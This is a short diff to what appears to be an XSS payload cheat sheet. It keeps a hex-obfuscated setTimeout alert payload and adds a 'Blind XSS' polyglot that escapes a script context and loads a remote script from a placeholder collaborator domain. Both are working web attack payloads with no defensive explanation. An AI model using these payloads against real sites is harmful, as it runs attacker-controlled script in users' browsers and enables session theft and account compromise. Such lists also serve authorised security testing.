@@ -10,3 +10,9 @@
 ```js
 setTimeout`\x61\x6c\x65\x72\x74\x28\x31\x29\` 
 ```
+
+## Blind XSS
+
+```
+</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>
+```
